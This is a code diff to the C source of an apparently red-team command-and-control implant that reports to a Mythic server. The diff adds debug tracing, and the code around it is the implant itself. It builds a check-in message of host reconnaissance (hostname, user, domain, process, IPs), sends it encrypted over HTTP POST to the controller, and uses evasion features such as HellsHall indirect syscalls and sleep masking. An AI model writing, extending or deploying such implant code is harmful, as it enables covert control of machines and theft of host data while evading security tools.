@@ -97,6 +97,25 @@ int es_strlen(const char* s) {
     return n;
 }
 
+#ifdef DEBUG
+// TEMP DIAGNOSTIC: append a stage marker to a file so we can see how far the
+// PIC agent gets on targets where OutputDebugString is not capturable.
+VOID es_dbg_trace(PINSTANCE inst, const char* msg) {
+    if (!inst || !inst->Win32.CreateFileA || !inst->Win32.WriteFile ||
+        !inst->Win32.CloseHandle) return;
+    xstr(_tp, "C:\\Users\\athena\\Desktop\\es_agent_trace.txt");
+    HANDLE h = inst->Win32.CreateFileA(_tp, 4 /*FILE_APPEND_DATA*/,
+        1 | 2 /*SHARE_READ|SHARE_WRITE*/, NULL, 4 /*OPEN_ALWAYS*/,
+        0x80 /*FILE_ATTRIBUTE_NORMAL*/, NULL);
+    if (h == (HANDLE)-1) return;
+    DWORD w = 0;
+    char nl[2] = { 0x0D, 0x0A };
+    inst->Win32.WriteFile(h, msg, es_strlen(msg), &w, NULL);
+    inst->Win32.WriteFile(h, nl, 2, &w, NULL);
+    inst->Win32.CloseHandle(h);
+}
+#endif
+
 VOID es_strcpy(char* dst, const char* src) {
     while (*src) *dst++ = *src++;
     *dst = 0;
@@ -772,7 +791,18 @@ VOID agent_init(PINSTANCE inst, HINSTANCE hDll) {
 #endif
 
     // Eagerly load sleepmask COFF so BeaconGate works before first sleep
+#ifdef INCLUDE_EVASION_HELLSHALL
+#ifdef _WIN64
+    // HellsHall indirect syscalls — x64 only. On x86 (WOW64), 32-bit ntdll
+    // doesn't use sysenter directly; it transitions through wow64cpu.dll's
+    // heaven's gate. Direct sysenter from WOW64 context crashes.
+    hellshall_init(inst);
+    DBG(inst, "[ES] HellsHall initialized");
+#endif
+#endif
+
 #if BEACON_GATE_ENABLED
+
 #ifdef SLEEPMASK_COFF_SIZE
     if (SLEEPMASK_COFF_SIZE > 0 && !inst->bSleepMaskLoaded) {
         sleepmask_load_coff(inst, (BYTE*)SLEEPMASK_COFF, SLEEPMASK_COFF_SIZE, "sleep_mask");
@@ -859,6 +889,7 @@ typedef struct _ES_ADAPTER_INFO {
 } ES_ADAPTER_INFO;
 
 BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
+    TRACE(inst, "checkin: entered");
     DWORD uuid_len = es_strlen(inst->Config.uuid);
 
     char hostname[256] = {0};
@@ -866,6 +897,7 @@ BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
     if (inst->Win32.GetComputerNameExA)
         inst->Win32.GetComputerNameExA(ComputerNameNetBIOS, hostname, &hostname_len);
     DWORD host_slen = es_strlen(hostname);
+    TRACE(inst, "checkin: hostname done");
 
     char username[256] = {0};
     DWORD user_slen = 0;
@@ -888,6 +920,7 @@ BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
     }
 
     DWORD pid = inst->Win32.GetCurrentProcessId ? inst->Win32.GetCurrentProcessId() : 0;
+    TRACE(inst, "checkin: pid done");
 
     char domain[256] = {0};
     DWORD dom_slen = 0;
@@ -900,6 +933,7 @@ BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
         DWORD r = pGetEnvVar(_ud, domain, sizeof(domain) - 1);
         if (r > 0 && r < sizeof(domain)) dom_slen = r;
     }
+    TRACE(inst, "checkin: domain done");
 
     xstr(_arch, "x64");
     DWORD arch_slen = 3;
@@ -911,6 +945,7 @@ BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
     DWORD proc_slen = 0;
     if (inst->Win32.GetModuleFileNameA)
         proc_slen = inst->Win32.GetModuleFileNameA(NULL, procname, sizeof(procname) - 1);
+    TRACE(inst, "checkin: procname done");
 
     char ips[512] = {0};
     DWORD ips_slen = 0;
@@ -945,11 +980,13 @@ BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
 
     DWORD integrity = 2;
 
+    TRACE(inst, "checkin: about to allocate");
     DWORD total = tlv_size(uuid_len) + tlv_size(host_slen) + tlv_size(user_slen) + tlv_size(4)
                 + tlv_size(dom_slen) + tlv_size(arch_slen) + tlv_size(os_slen)
                 + tlv_size(proc_slen) + tlv_size(ips_slen) + tlv_size(4) + tlv_size(0);
     BYTE* buf = (BYTE*)es_malloc(inst, total);
     if (!buf) return NULL;
+    TRACE(inst, "checkin: allocated, packing TLVs");
 
     DWORD pos = 0;
     BYTE be4[4];
@@ -969,6 +1006,7 @@ BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
     tlv_pack(buf + pos, TLV_EXT_IP, (const BYTE*)"", 0);                    pos += tlv_size(0);
 
     *msg_len = pos;
+    TRACE(inst, "checkin: done");
     return buf;
 }
 
@@ -1105,6 +1143,7 @@ static BOOL http_post_response_stub(PINSTANCE inst, BYTE* data, DWORD len,
 // Send a message to Mythic: encrypt → UUID-prepend → base64-encode → POST → base64-decode → strip UUID → decrypt
 BOOL send_mythic_msg(PINSTANCE inst, BYTE* payload, DWORD payload_len,
                             BYTE** response, DWORD* resp_len) {
+    TRACE(inst, "send_mythic_msg: entered");
     BYTE* send_data = payload;
     DWORD send_len = payload_len;
     BOOL encrypted = has_encryption_key(inst);
@@ -1131,7 +1170,9 @@ BOOL send_mythic_msg(PINSTANCE inst, BYTE* payload, DWORD payload_len,
 
     BYTE* raw_resp = NULL;
     DWORD raw_resp_len = 0;
+    TRACE(inst, "send_mythic_msg: calling http_post_response");
     BOOL ok = http_post_response(inst, b64_data, b64_len, &raw_resp, &raw_resp_len);
+    TRACE(inst, "send_mythic_msg: http_post_response returned");
     es_free(inst, b64_data);
 
     if (!ok || !raw_resp || raw_resp_len == 0) {
@@ -1251,13 +1292,26 @@ VOID es_smb_process_tasking(PINSTANCE inst, const BYTE* msg, DWORD msg_len,
 
 VOID agent_main(PINSTANCE inst) {
     inst->Running = TRUE;
+    TRACE(inst, "agent_main: entered");
     DBG(inst, "[ES] agent_main entered");
     register_commands(inst);
+    TRACE(inst, "agent_main: commands registered");
+
+    TRACE(inst, "agent_main: pre-transport");
+#ifdef HTTP_TRANSPORT
+    TRACE(inst, "agent_main: transport=HTTP");
+#else
+    TRACE(inst, "agent_main: transport=NOT_HTTP");
+#endif
+#ifdef SMB_TRANSPORT
+    TRACE(inst, "agent_main: transport=SMB");
+#endif
 
 #ifdef HTTP_TRANSPORT
     // Initial checkin
     DWORD checkin_len = 0;
     BYTE* checkin_msg = build_checkin_msg(inst, &checkin_len);
+    TRACE(inst, "agent_main: build_checkin_msg returned");
     if (checkin_msg) {
         BYTE* resp = NULL;
         DWORD resp_len = 0;
@@ -1274,6 +1328,7 @@ VOID agent_main(PINSTANCE inst) {
         if (resp) es_free(inst, resp);
         es_free(inst, checkin_msg);
     }
+    TRACE(inst, "agent_main: initial checkin attempted");
 
     DBG(inst, "[ES] Entering main loop");
     // Main tasking loop
@@ -1655,6 +1710,7 @@ EXTERN_C VOID main_entry(PVOID base_addr) {
     inst->Base.Buffer = base_addr;
 
     agent_init(inst, (HINSTANCE)base_addr);
+    TRACE(inst, "main_entry: agent_init returned");
 
     /* NOTE: INCLUDE_EVASION_CLEANUP does not apply here. In standalone PIC mode
        base_addr is the allocation holding this agent's own .text and instance
@@ -1664,5 +1720,6 @@ EXTERN_C VOID main_entry(PVOID base_addr) {
        still executing inside it - instant AV on the next instruction fetch. */
 
     agent_main(inst);
+    TRACE(inst, "main_entry: agent_main returned");
 }
 #endif
